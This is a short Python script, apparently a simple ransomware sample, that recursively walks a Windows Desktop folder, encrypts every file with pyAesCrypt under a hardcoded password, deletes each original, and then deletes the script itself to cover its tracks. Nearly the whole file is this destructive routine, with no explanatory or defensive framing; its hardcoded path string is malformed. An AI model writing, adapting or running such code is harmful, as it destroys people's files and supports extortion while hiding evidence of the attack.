
import os
from sys import argv
from pyAesCrypt import encryptFile
def encrypt(file):
	print("---------------------------------------------------------------")
	password = "1256"
	bufferSize = 128*1024
	encryptFile(file, file+".crp", password, bufferSize)
	print("[encrypted] '{name}.crp'".format(name = file))
	os.remove(file)
def walk(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir, name)
		if os.path.isfile(path): encrypt(path)
		else: walk(path)
walk("C:\Users\user\Desktop>")
print("---------------------------------------------------------------")
os.remove(argv[0])
